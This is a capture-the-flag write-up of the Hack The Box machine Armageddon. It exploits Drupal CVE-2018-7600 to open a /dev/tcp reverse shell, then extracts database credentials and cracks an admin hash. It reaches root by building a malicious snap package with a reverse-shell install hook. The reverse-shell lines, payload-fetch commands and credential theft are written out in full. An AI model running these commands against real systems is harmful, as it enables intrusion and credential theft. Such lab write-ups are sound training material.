## Default Information
IP address : 10.10.10.233\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```
nmap -sC -sV -A -p- -T4 10.10.10.233 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.4 (protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) | Open |

Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.10.233 -T4 -vv 
```

Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 

```
10.10.10.233    armageddon.htb
```

## Discovery

Firstly, We will now run ```gobuster``` on ```http://armageddon.htb``` to enumerate the directories on the endpoints. However, we were unable to find any meaningful endpoints 
from the output.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://armageddon.htb/ -w /home/kali/Desktop/subdomains.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://armageddon.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/kali/Desktop/subdomains.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/27 00:37:20 Starting gobuster in directory enumeration mode
===============================================================
http://armageddon.htb/sites                (Status: 301) [Size: 236] [--> http://armageddon.htb/sites/]
http://armageddon.htb/scripts              (Status: 301) [Size: 238] [--> http://armageddon.htb/scripts/]
http://armageddon.htb/themes               (Status: 301) [Size: 237] [--> http://armageddon.htb/themes/] 
http://armageddon.htb/profiles             (Status: 301) [Size: 239] [--> http://armageddon.htb/profiles/]
http://armageddon.htb/misc                 (Status: 301) [Size: 235] [--> http://armageddon.htb/misc/] 
http://armageddon.htb/modules              (Status: 301) [Size: 238] [--> http://armageddon.htb/modules/] 

```
Next, we will try to fuzz for potential virtual hosts using ```Gobuster```, but we were unable to discover any virtual hosts.

Now, we will run ```whatweb``` to identify the web technologies. From the output, we discovered that the website is using a CMS known as Drupal, and we also know that Drupal 
contains a few security vulnerabilities.

```
┌──(kali㉿kali)-[~]
└─$ whatweb http://armageddon.htb                     
http://armageddon.htb [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
```

From ```whatweb```, we know that the website supports PHP. Now, we will try to enumerate for endpoints again, but using php as a file extension. However, we were not able to find any interesting endpoints from the output. 

```
                                                                                        
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://armageddon.htb/ -w /home/kali/Desktop/subdomains.txt -e -k -t 50 -x php                       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://armageddon.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/kali/Desktop/subdomains.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/27 02:40:21 Starting gobuster in directory enumeration mode
===============================================================
http://armageddon.htb/scripts              (Status: 301) [Size: 238] [--> http://armageddon.htb/scripts/]
http://armageddon.htb/themes               (Status: 301) [Size: 237] [--> http://armageddon.htb/themes/] 
http://armageddon.htb/profiles             (Status: 301) [Size: 239] [--> http://armageddon.htb/profiles/]
http://armageddon.htb/install.php          (Status: 200) [Size: 3206] 
http://armageddon.htb/index.php            (Status: 200) [Size: 7480] 
http://armageddon.htb/cron.php             (Status: 403) [Size: 7428]
http://armageddon.htb/misc                 (Status: 301) [Size: 235] [--> http://armageddon.htb/misc/] 
http://armageddon.htb/modules              (Status: 301) [Size: 238] [--> http://armageddon.htb/modules/] 
http://armageddon.htb/xmlrpc.php           (Status: 200) [Size: 42]
http://armageddon.htb/includes             (Status: 301) [Size: 239] [--> http://armageddon.htb/includes/]
http://armageddon.htb/authorize.php        (Status: 403) [Size: 2854]
```

Next, we would need to find the version of Drupal that is being used. Looking at the forums [here](https://www.drupal.org/forum/support/post-installation/2005-10-16/how-to-check-drupal-version), we can find the latest version of Drupal used at the ```/CHANGELOG.txt``` endpoint. Visiting that endpoint, we discover that the latest version of Drupal is 7.56

![Drupal version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Armagaddon/drupal_version.PNG)

Reseaching on Drupal online, we realized that Drupal 7.56 may be vulnerable to CVE-2018-7600, which is a remote code execution vulnerability. For this CVE, we are able to find an exploit code on github [here](https://github.com/pimps/CVE-2018-7600
* Tried to use burp suite to exploit it but failed to exploit
* Noticed that this exploit fails on other port numbers, but succeeds on 80 and 443 (Probably there is some network filtering that only allows HTTP/HTTPS packets)

```
┌──(htb)─(kali㉿kali)-[~/Desktop/cve/CVE-2018-7600]
└─$ python3 drupa7-CVE-2018-7600.py http://armageddon.htb/ -c "/bin/bash -l > /dev/tcp/10.10.16.5/80 0<&1 2>&1" 

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-Fj590FyjhiAdl0tTQ2AzhhFiz1ZL8pco6ubljoNInT0
[*] Triggering exploit to execute: /bin/bash -l > /dev/tcp/10.10.16.5/80 0<&1 2>&1
```

## Obtaining user flag

Next, we would have to stabilize our shell. However, we are faced with a ```OSError: out of pty devices``` when we try to stabilize the shell. We would use an alternative method ```/bin/bash -i``` to obtain our shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 80                 
listening on [any] 80 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.233] 46888
python3 -c 'import pty; pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/lib64/python3.6/pty.py", line 154, in spawn
    pid, master_fd = fork()
  File "/usr/lib64/python3.6/pty.py", line 96, in fork
    master_fd, slave_fd = openpty()
  File "/usr/lib64/python3.6/pty.py", line 29, in openpty
    master_fd, slave_name = _open_terminal()
  File "/usr/lib64/python3.6/pty.py", line 59, in _open_terminal
    raise OSError('out of pty devices')
OSError: out of pty devices
/bin/bash -i
bash: no job control in this shell
bash-4.2$ export TERM=xterm
export TERM=xterm
bash-4.2$ stty cols 132 rows 34
stty cols 132 rows 34
stty: standard input: Inappropriate ioctl for device
bash-4.2$
```

However, we realize that we do not have the permissions to view the user flag

```
ls -la home
ls: cannot open directory home: Permission denied
bash-4.2$ 
```

We also realize that we are unable to execute linepeas script here to discover privilege escalation vectors as we do not have```wget``` and ```curl``` failed to connect to our local machine

```
wget http://10.10.16.5:4000/linpeas.sh
bash: wget: command not found
bash-4.2$ curl -o linpeas.sh http://10.10.16.5:4000/linpeas.sh
curl -o linpeas.sh http://10.10.16.5:4000/linpeas.sh
curl: (7) Failed to connect to 10.10.16.5: Permission denied
```

However, what we noticed is that the terminal has a mysql database. So, now we will search for the database credentials to login to the database. From the forum [here](https://www.drupal.org/forum/support/post-installation/2017-01-13/where-are-the-database-username-and-password-stored), we know that the database credentials are stored in /sites/default/settings.php. We will then navigate to the file to find the database credentials.

```
bash-4.2$ cd sites
cd sites
bash-4.2$ ls
ls
README.txt
all
default
example.sites.php
bash-4.2$ cd default
cd default
bash-4.2$ ls
ls
default.settings.php
files
settings.php
bash-4.2$ cat settings.php
cat settings.php
```

From the PHP file, we are able to find the database credentials

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Using these credentials, we are able to login to the mysql database and find a user called ```brucetherealadmin```, with the corresponding password hash ```$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt```

```
bash-4.2$ mysql -u drupaluser -p -h localhost -D drupal
mysql -u drupaluser -p -h localhost -D drupal
Enter password: CQHEy@9M*m23gBVj
use drupal
select * from users;
exit
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London               0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
bash-4.2$ 
```

Now, we have to identify the type of hash so that we can specify the hash type when cracking using hashcat

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashid -m '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
[+] Drupal > v7.x [Hashcat Mode: 7900]
```

Next, we will use hashcat to crack the hash. The hash turns out to be ```booboo```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat ~/.hashcat/hashcat.potfile
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```
Now, all we have to do is to SSH as ```brucetherealadmin``` and we can obtain the flag

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ cat user.txt
<Redacted user flag>
[brucetherealadmin@armageddon ~]$ 
```

## Obtaining root flag

Now, we will try to find the commands that can be executed by the user with root privileges without any password. We realize that we can install malicious packages using ```snap``` with root privileges without any password.

```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Looking at [GTFO Bins](https://gtfobins.github.io/gtfobins/snap/), we are able to create a package that can create a reverse shell

```
┌──(kali㉿kali)-[/tmp]
└─$ COMMAND="bash -c 'exec bash -i &>/dev/tcp/10.10.16.5/80 <&1'"                   1 ⚙
                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd $(mktemp -d)                                                                 1 ⚙
                                                                                        
┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
└─$ mkdir -p meta/hooks                                                             1 ⚙
                                                                                        
┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
└─$ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install                    1 ⚙
                                                                                        
┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
└─$ chmod +x meta/hooks/install                                                     1 ⚙
                                                                                        
┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
└─$ fpm -n xxxx -s dir -t snap -a all meta                                          1 ⚙
Created package {:path=>"xxxx_1.0_all.snap"}
```

Afterwards, we will download the malicious package on our SSH terminal and install the malicious package

```
sudo snap install exploit.snap --dangerous --devmode
```

Lastly, all we have to do is to obtain the root flag from our reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 80                                                                     1 ⚙
listening on [any] 80 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.233] 46900
bash: cannot set terminal process group (5067): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3# whoami
whoami
root
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
anaconda-ks.cfg
cleanup.sh
passwd
reset.sh
root.txt
snap
bash-4.3# cat root.txt
cat root.txt
<Redacted root flag>
bash-4.3# 
```
